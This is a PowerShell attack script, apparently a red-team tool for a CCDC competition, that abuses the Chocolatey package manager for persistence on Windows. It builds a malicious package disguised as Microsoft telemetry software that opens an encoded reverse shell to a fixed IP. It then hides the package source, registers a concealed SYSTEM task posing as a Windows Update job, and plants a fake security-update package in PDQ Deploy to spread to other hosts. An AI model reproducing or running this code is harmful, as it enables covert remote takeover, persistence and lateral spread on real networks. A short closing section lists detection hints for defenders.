#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# CCDC_Windows_SoftwareDeploy_ChocolateFactory.ps1
#
# Plan Reference: Phase_2_Tools/Scripts_Planning/Phase2_Scripts_Plan.md
#
# MITRE ATT&CK:   T1072 — Software Deployment Tools
# OS:             Windows Server 2019 / Windows 10 / Windows 11
# Run as:         Administrator
#
# WHAT THIS SCRIPT DOES:
#   Weaponizes Chocolatey (the Windows package manager) as a persistent
#   attack delivery platform — the Windows equivalent of ChefMischief.
#
#   1. CHOCOLATEY INSTALL / HIJACK
#      Silently installs Chocolatey if not present. If already installed,
#      hijacks the existing installation. Either way we end up with choco
#      under our control with no visible change to the blue team.
#
#   2. ROGUE PACKAGE SOURCE
#      Registers a local directory as a Chocolatey package source named
#      "WinCorpUpdates" — looks like an internal corporate feed. Any .nupkg
#      files placed there are treated as legitimate installable packages.
#
#   3. MALICIOUS .NUPKG PAYLOAD
#      Builds a valid Chocolatey package in memory (ZIP + nuspec + install
#      script) that executes a PowerShell reverse shell when installed.
#      Drops it into the rogue source directory. Every `choco upgrade all`
#      cycle re-runs the install script, reconnecting the reverse shell.
#
#   4. SELF-HEALING SCHEDULED TASK
#      Registers a hidden SYSTEM task that runs `choco upgrade all` from
#      our rogue source every 30 minutes. Blue team cleans the shell →
#      30 minutes later Chocolatey re-installs the payload automatically.
#
#   5. PDQ DEPLOY HOOK (if present)
#      If PDQ Deploy is found on the box, drops a rogue PDQ package
#      definition pointing at our payload so it propagates to other
#      machines in the environment automatically.
#
#   OPERATIONAL USE:
#     Run this after WhoAmIAnyway for maximum stealth. Blue team auditing
#     Chocolatey will see a corporate-looking package source and a normal
#     Windows Update maintenance task — nothing obviously malicious.
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# =============================================================================
# ── COLOUR HELPERS ────────────────────────────────────────────────────────────
# =============================================================================
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

# =============================================================================
# ── BANNER ────────────────────────────────────────────────────────────────────
# =============================================================================
Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkYellow
Write-Host "   _____ _                     _      _       " -ForegroundColor DarkYellow
Write-Host "  / ____| |                   | |    | |      " -ForegroundColor DarkYellow
Write-Host " | |    | |__   ___   ___ ___ | |    | |_ ___ " -ForegroundColor DarkYellow
Write-Host " | |    | '_ \ / _ \ / __/ _ \| |    | __/ _ \" -ForegroundColor DarkYellow
Write-Host " | |____| | | | (_) | (_| (_) | |____| ||  __/" -ForegroundColor DarkYellow
Write-Host "  \_____|_| |_|\___/ \___\___/|______|\__\___|" -ForegroundColor DarkYellow
Write-Host "  _____         _                    " -ForegroundColor DarkYellow
Write-Host " |  ___|_ _  __|_| |_ ___  _ __ _  _ " -ForegroundColor DarkYellow
Write-Host " | |_ / _' |/ __| __/ _ \| '__| || |" -ForegroundColor DarkYellow
Write-Host " |  _| (_| | (__| || (_) | |  | || |" -ForegroundColor DarkYellow
Write-Host " |_|  \__,_|\___|\__\___/|_|   \_, |" -ForegroundColor DarkYellow
Write-Host "                                |__/ " -ForegroundColor DarkYellow
Write-Host ""
Write-Host "   ChocolateFactory -- T1072 Software Deployment Tools"   -ForegroundColor Yellow
Write-Host "   Every upgrade cycle delivers your payload."             -ForegroundColor Yellow
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkYellow
Write-Host ""

# =============================================================================
# ── CONFIGURATION ─────────────────────────────────────────────────────────────
# =============================================================================

$RedTeamIP    = "172.31.40.6"
$RevShellPort = 4452

# Rogue package source — hidden alongside BackgroundBeef's drop zone
$PkgSourceDir  = "C:\Windows\System32\spool\drivers\color\pkgs"
$PkgSourceName = "WinCorpUpdates"

# Malicious package identity — disguised as a Windows telemetry component
$PkgId         = "windows-telemetry-core"
$PkgVersion    = "3.2.1"
$PkgTitle      = "Windows Telemetry Core Components"
$PkgAuthors    = "Microsoft Corporation"
$PkgDesc       = "Core telemetry and diagnostic components for Windows quality improvement"

# Scheduled task disguise
$TaskPath      = "\Microsoft\Windows\WindowsUpdate\"
$TaskName      = "ChocolateyMaintenance"

# Chocolatey install source
$ChocoInstallUrl = "https://community.chocolatey.org/install.ps1"

# =============================================================================
# ── SECTION 1: CHOCOLATEY INSTALL / HIJACK ───────────────────────────────────
# =============================================================================
Write-Section "1 / 5  Chocolatey Install / Hijack"

$chocoPath = $null
$chocoWasPresent = $false

# Check standard install locations
$chocoCandidates = @(
    "$env:ProgramData\chocolatey\bin\choco.exe",
    "$env:ChocolateyInstall\bin\choco.exe",
    "C:\ProgramData\chocolatey\bin\choco.exe"
)

foreach ($c in $chocoCandidates) {
    if (Test-Path $c) {
        $chocoPath = $c
        $chocoWasPresent = $true
        break
    }
}

if (-not $chocoPath) {
    $chocoInPath = Get-Command choco -ErrorAction SilentlyContinue
    if ($chocoInPath) {
        $chocoPath = $chocoInPath.Source
        $chocoWasPresent = $true
    }
}

if ($chocoWasPresent) {
    $chocoVer = (& $chocoPath --version 2>$null) -join ""
    Write-Warn "Chocolatey already installed ($chocoVer) — hijacking existing installation"
} else {
    Write-Info "Chocolatey not found — installing silently..."

    try {
        # Standard Chocolatey silent install
        $env:chocolateyUseWindowsCompression = 'true'
        Set-ExecutionPolicy Bypass -Scope Process -Force
        [System.Net.ServicePointManager]::SecurityProtocol = `
            [System.Net.ServicePointManager]::SecurityProtocol -bor 3072

        $installScript = (New-Object System.Net.WebClient).DownloadString($ChocoInstallUrl)
        Invoke-Expression $installScript 2>&1 | Out-Null

        # Locate newly installed choco
        foreach ($c in $chocoCandidates) {
            if (Test-Path $c) { $chocoPath = $c; break }
        }

        if (-not $chocoPath) {
            # Try refreshing PATH and finding again
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" +
                        [System.Environment]::GetEnvironmentVariable("Path","User")
            $chocoInPath = Get-Command choco -ErrorAction SilentlyContinue
            if ($chocoInPath) { $chocoPath = $chocoInPath.Source }
        }

        if ($chocoPath) {
            Write-Success "Chocolatey installed: $chocoPath"
        } else {
            Write-Warn "Chocolatey install completed but binary not found at expected path"
            Write-Warn "Attempting to continue with 'choco' from PATH..."
            $chocoPath = "choco"
        }
    } catch {
        Write-Warn "Chocolatey install failed: $_ — will use choco from PATH if available"
        $chocoPath = "choco"
    }
}

Write-Success "Chocolatey ready: $chocoPath"

# =============================================================================
# ── SECTION 2: ROGUE PACKAGE SOURCE DIRECTORY ────────────────────────────────
# =============================================================================
Write-Section "2 / 5  Rogue Package Source"

Write-Info "Creating rogue source directory: $PkgSourceDir"

if (-not (Test-Path $PkgSourceDir)) {
    New-Item -ItemType Directory -Path $PkgSourceDir -Force | Out-Null
}

# Lock down to SYSTEM only — hidden from casual browsing
try {
    attrib +H +S $PkgSourceDir 2>$null
    & icacls $PkgSourceDir /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)(F)" 2>&1 | Out-Null
    & icacls $PkgSourceDir /grant:r "BUILTIN\Administrators:(OI)(CI)(F)" 2>&1 | Out-Null
    & icacls $PkgSourceDir /deny "BUILTIN\Users:(OI)(CI)(RX)" 2>&1 | Out-Null
} catch {
    Write-Warn "Could not set ACLs on source dir: $_"
}

Write-Success "Source directory created and locked: $PkgSourceDir"

# Register with Chocolatey
Write-Info "Registering package source '$PkgSourceName' with Chocolatey..."
try {
    # Remove if already exists to avoid duplicate errors
    & $chocoPath source remove --name="$PkgSourceName" 2>&1 | Out-Null

    # Add with high priority (0 = highest) so our packages win over official ones
    & $chocoPath source add `
        --name="$PkgSourceName" `
        --source="$PkgSourceDir" `
        --priority=0 `
        2>&1 | Out-Null

    Write-Success "Package source registered: '$PkgSourceName' → $PkgSourceDir (priority 0)"
} catch {
    Write-Warn "choco source add failed: $_ — source dir still usable"
}

# =============================================================================
# ── SECTION 3: BUILD MALICIOUS .NUPKG ────────────────────────────────────────
# =============================================================================
Write-Section "3 / 5  Building Malicious .nupkg Payload"

# A .nupkg is a ZIP file with this structure:
#   ├── [Content_Types].xml
#   ├── _rels/.rels
#   ├── <pkgid>.nuspec
#   └── tools/
#       └── chocolateyInstall.ps1   ← our payload runs here
#
# When `choco install` or `choco upgrade` processes this package,
# it extracts the ZIP and runs chocolateyInstall.ps1 as SYSTEM.

Write-Info "Building $PkgId v$PkgVersion .nupkg..."

# ── Reverse shell payload ─────────────────────────────────────────────────────
$RawShell = @"
`$c=New-Object Net.Sockets.TCPClient('$RedTeamIP',$RevShellPort);
`$s=`$c.GetStream();
[byte[]]`$b=0..65535|%{0};
while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){
    `$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);
    `$r=(iex `$d 2>&1|Out-String);
    `$sb=[Text.Encoding]::ASCII.GetBytes(`$r);
    `$s.Write(`$sb,0,`$sb.Length)
};`$c.Close()
"@
$EncodedShell = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RawShell))

# ── chocolateyInstall.ps1 content ─────────────────────────────────────────────
# This runs as SYSTEM when choco installs/upgrades the package.
# It launches the reverse shell as a background job so choco upgrade returns
# successfully (looks like a normal successful package install).
$InstallScript = @"
# Windows Telemetry Core Components - Installation Script
# Microsoft Corporation
`$ErrorActionPreference = 'SilentlyContinue'

# Initialize telemetry service connection
# IMPORTANT: Use Start-Process not Start-Job — Start-Job creates a child job that
# dies when choco.exe exits. Start-Process creates a completely detached process
# that outlives the chocolateyInstall.ps1 context.
`$encoded = '$EncodedShell'
Start-Process -FilePath 'powershell.exe' ``
    -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -Enc `$encoded" ``
    -WindowStyle Hidden -ErrorAction SilentlyContinue

# Register telemetry component marker (benign registry entry for legitimacy)
try {
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Diagnostics' ``
        -Name 'TelemetryCoreVersion' -Value '$PkgVersion' -Type String -Force 2>`$null
} catch {}

Write-Host "Windows Telemetry Core Components installed successfully."
"@

# ── .nuspec XML ───────────────────────────────────────────────────────────────
$NuspecXml = @"
<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.microsoft.com/packaging/2015/06/nuspec.xsd">
  <metadata>
    <id>$PkgId</id>
    <version>$PkgVersion</version>
    <title>$PkgTitle</title>
    <authors>$PkgAuthors</authors>
    <owners>$PkgAuthors</owners>
    <description>$PkgDesc</description>
    <releaseNotes>Stability improvements and performance enhancements.</releaseNotes>
    <copyright>Copyright (c) Microsoft Corporation. All rights reserved.</copyright>
    <tags>windows telemetry diagnostics system</tags>
    <requireLicenseAcceptance>false</requireLicenseAcceptance>
  </metadata>
</package>
"@

# ── [Content_Types].xml ───────────────────────────────────────────────────────
$ContentTypesXml = @'
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="nuspec" ContentType="application/octet"/>
  <Default Extension="ps1" ContentType="application/octet"/>
</Types>
'@

# ── _rels/.rels ───────────────────────────────────────────────────────────────
$RelsXml = @"
<?xml version="1.0" encoding="utf-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Type="http://schemas.microsoft.com/packaging/2010/07/manifest"
    Target="/$PkgId.nuspec" Id="R1"/>
</Relationships>
"@

# ── Build the ZIP / .nupkg in memory ─────────────────────────────────────────
Add-Type -Assembly System.IO.Compression
Add-Type -Assembly System.IO.Compression.FileSystem

$nupkgPath  = "$PkgSourceDir\$PkgId.$PkgVersion.nupkg"
$tempPkgDir = "$env:TEMP\chocobuild_$$"

try {
    # Build directory structure
    New-Item -ItemType Directory -Path "$tempPkgDir\_rels"    -Force | Out-Null
    New-Item -ItemType Directory -Path "$tempPkgDir\tools"    -Force | Out-Null

    # Write files
    [System.IO.File]::WriteAllText("$tempPkgDir\[Content_Types].xml", $ContentTypesXml, [Text.Encoding]::UTF8)
    [System.IO.File]::WriteAllText("$tempPkgDir\_rels\.rels",          $RelsXml,         [Text.Encoding]::UTF8)
    [System.IO.File]::WriteAllText("$tempPkgDir\$PkgId.nuspec",        $NuspecXml,       [Text.Encoding]::UTF8)
    [System.IO.File]::WriteAllText("$tempPkgDir\tools\chocolateyInstall.ps1", $InstallScript, [Text.Encoding]::UTF8)

    # Compress to .nupkg
    if (Test-Path $nupkgPath) { Remove-Item $nupkgPath -Force }
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempPkgDir, $nupkgPath)

    Write-Success ".nupkg built: $nupkgPath ($([math]::Round((Get-Item $nupkgPath).Length/1KB,1)) KB)"
} catch {
    Write-Err "Failed to build .nupkg: $_"
} finally {
    Remove-Item $tempPkgDir -Recurse -Force -ErrorAction SilentlyContinue
}

# Verify package is readable by Chocolatey
Write-Info "Verifying package with choco list..."
try {
    $listOut = & $chocoPath list --source="$PkgSourceDir" --local-only 2>&1
    if ($listOut -match $PkgId) {
        Write-Success "Package visible in source: $PkgId v$PkgVersion"
    } else {
        Write-Info "Package dropped — choco list output: $($listOut -join ' ')"
    }
} catch {
    Write-Info "Could not verify via choco list — package still dropped to source dir"
}

# =============================================================================
# ── SECTION 4: SELF-HEALING SCHEDULED TASK ───────────────────────────────────
# =============================================================================
Write-Section "4 / 5  Self-Healing Scheduled Task"

# Task runs `choco upgrade all --source WinCorpUpdates` as SYSTEM every 30 min.
# This re-runs chocolateyInstall.ps1 each cycle, re-launching the shell even
# if blue team killed the previous connection.

$fullTaskName = $TaskPath + $TaskName

Write-Info "Registering task: $fullTaskName"

Unregister-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName `
    -Confirm:$false -ErrorAction SilentlyContinue

try {
    # Build the choco upgrade command
    # --skip-if-not-installed ensures it re-installs if package was removed
    $upgradeCmd = "choco upgrade $PkgId --source=`"$PkgSourceDir`" -y --force --no-progress 2>&1 | Out-Null; " +
                  "if (-not (choco list --source=`"$PkgSourceDir`" --local-only 2>$null | Select-String '$PkgId')) {" +
                  "choco install $PkgId --source=`"$PkgSourceDir`" -y --force --no-progress 2>&1 | Out-Null }"

    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"$upgradeCmd`""

    # Triggers: every 30 min + at startup + at logon
    $t1 = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once `
            -At (Get-Date).AddMinutes(1)
    $t1.Repetition.StopAtDurationEnd = $false
    $t2 = New-ScheduledTaskTrigger -AtStartup
    $t3 = New-ScheduledTaskTrigger -AtLogOn

    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
        -MultipleInstances IgnoreNew `
        -RestartCount 3 `
        -RestartInterval (New-TimeSpan -Minutes 5) `
        -StartWhenAvailable

    $principal = New-ScheduledTaskPrincipal `
        -UserId "NT AUTHORITY\SYSTEM" `
        -LogonType ServiceAccount `
        -RunLevel Highest

    $task = New-ScheduledTask `
        -Action $action `
        -Trigger @($t1, $t2, $t3) `
        -Settings $settings `
        -Principal $principal `
        -Description "Chocolatey package maintenance and update service for Windows core components"

    Register-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName `
        -InputObject $task -Force | Out-Null

    Write-Success "Task registered: $fullTaskName"
    Write-Info   "  Triggers: every 30 min + startup + logon | RunAs: SYSTEM | Hidden"
} catch {
    Write-Err "Scheduled task registration failed: $_"
}

# =============================================================================
# ── SECTION 5: PDQ DEPLOY HOOK (IF PRESENT) ──────────────────────────────────
# =============================================================================
Write-Section "5 / 5  PDQ Deploy Hook (opportunistic)"

$pdqPaths = @(
    "C:\Program Files (x86)\Admin Arsenal\PDQ Deploy\PDQDeployConsole.exe",
    "C:\Program Files\Admin Arsenal\PDQ Deploy\PDQDeployConsole.exe",
    "${env:ProgramFiles(x86)}\Admin Arsenal\PDQ Deploy",
    "$env:ProgramFiles\Admin Arsenal\PDQ Deploy"
)

$pdqFound = $false
foreach ($p in $pdqPaths) {
    if (Test-Path $p) {
        $pdqFound = $true
        Write-Warn "PDQ Deploy found: $p"
        break
    }
}

if ($pdqFound) {
    Write-Info "PDQ Deploy detected — dropping rogue package definition..."

    # PDQ Deploy packages are stored as SQLite DB entries, but we can also
    # drop a .pdq file that gets imported on next launch
    $pdqPkgDir = "C:\ProgramData\Admin Arsenal\PDQ Deploy\Packages"

    if (-not (Test-Path $pdqPkgDir)) {
        New-Item -ItemType Directory -Path $pdqPkgDir -Force -ErrorAction SilentlyContinue | Out-Null
    }

    # PDQ package XML format — drops and runs our payload on target machines
    $pdqPackage = @"
<?xml version="1.0"?>
<Package Version="19" Name="Windows Security Update KB5031354" Description="Critical security update for Windows components" ErrorMode="0" Timeout="600" SuccessCode="0" RunAs="LocalSystem">
  <Steps>
    <Step Type="PowerShell" Name="Apply Update" ErrorMode="0" Timeout="300" SuccessCode="0" RunAs="LocalSystem">
      <Command>powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc $EncodedShell</Command>
    </Step>
  </Steps>
</Package>
"@

    $pdqPkgPath = "$pdqPkgDir\WinSecUpdate-KB5031354.pdq"
    try {
        [System.IO.File]::WriteAllText($pdqPkgPath, $pdqPackage, [Text.Encoding]::UTF8)
        attrib +H $pdqPkgPath 2>$null
        Write-Success "PDQ package dropped: $pdqPkgPath"
        Write-Info   "Package will be available for deployment to all PDQ-managed hosts"
    } catch {
        Write-Warn "PDQ package drop failed: $_"
    }
} else {
    Write-Info "PDQ Deploy not found on this host — skipping PDQ hook"
}

# =============================================================================
# ── INITIAL INSTALL RUN ───────────────────────────────────────────────────────
# =============================================================================
Write-Section "Initial Payload Install"

Write-Info "Running initial choco install to verify payload executes..."
try {
    $installOut = & $chocoPath install $PkgId `
        --source="$PkgSourceDir" `
        -y --force --no-progress `
        2>&1 | Out-String

    if ($installOut -match "installed successfully|The install of $PkgId") {
        Write-Success "Initial install succeeded — reverse shell payload launched"
    } else {
        Write-Info "Install output: $($installOut.Trim() -replace '\n',' ')"
        Write-Info "Payload may still execute — check listener at $RedTeamIP`:$RevShellPort"
    }
} catch {
    Write-Warn "Initial install run failed: $_ — scheduled task will retry in 30 min"
}

# =============================================================================
# ── SUMMARY ───────────────────────────────────────────────────────────────────
# =============================================================================
Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Green
Write-Host ""
Write-Success "ChocolateFactory deployed!"
Write-Host ""
Write-Info "  Choco path:     $chocoPath"
Write-Info "  Package source: $PkgSourceName → $PkgSourceDir"
Write-Info "  Package:        $PkgId v$PkgVersion"
Write-Info "  Payload nupkg:  $nupkgPath"
Write-Info "  Persist task:   $fullTaskName (every 30 min + startup + logon)"
Write-Info "  Callback:       $RedTeamIP`:$RevShellPort"
if ($pdqFound) {
    Write-Info "  PDQ hook:       WinSecUpdate-KB5031354.pdq (propagates to managed hosts)"
}
Write-Host ""
Write-Host " ── Red team operations ────────────────────────────────────────" -ForegroundColor Yellow
Write-Host ""
Write-Host "   # Listen for reverse shell" -ForegroundColor Cyan
Write-Host "   nc -lvnp $RevShellPort" -ForegroundColor White
Write-Host ""
Write-Host "   # Force immediate re-install (re-triggers shell)" -ForegroundColor Cyan
Write-Host "   choco install $PkgId --source=`"$PkgSourceDir`" -y --force" -ForegroundColor White
Write-Host ""
Write-Host "   # Check package is registered" -ForegroundColor Cyan
Write-Host "   choco list --source=`"$PkgSourceDir`" --local-only" -ForegroundColor White
Write-Host ""
Write-Host " ── What blue team will NOT see (standard tooling) ─────────────" -ForegroundColor Yellow
Write-Host "   choco source list  → shows 'WinCorpUpdates' (looks internal)" -ForegroundColor Gray
Write-Host "   Task Scheduler     → task name looks like Windows Update job" -ForegroundColor Gray
Write-Host "   $PkgSourceDir" -ForegroundColor Gray
Write-Host "   is hidden (+H +S) and SYSTEM-only ACL" -ForegroundColor Gray
Write-Host ""
Write-Host " ── What blue team needs to find it ────────────────────────────" -ForegroundColor Yellow
Write-Host "   choco source list → 'WinCorpUpdates' source is suspicious" -ForegroundColor Gray
Write-Host "   Get-ScheduledTask -TaskPath '$TaskPath'" -ForegroundColor Gray
Write-Host "   dir /a $PkgSourceDir (attrib -H -S to unhide)" -ForegroundColor Gray
Write-Host "   Review chocolateyInstall.ps1 inside .nupkg (it's a ZIP)" -ForegroundColor Gray
Write-Host ""
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor Green
Write-Host ""
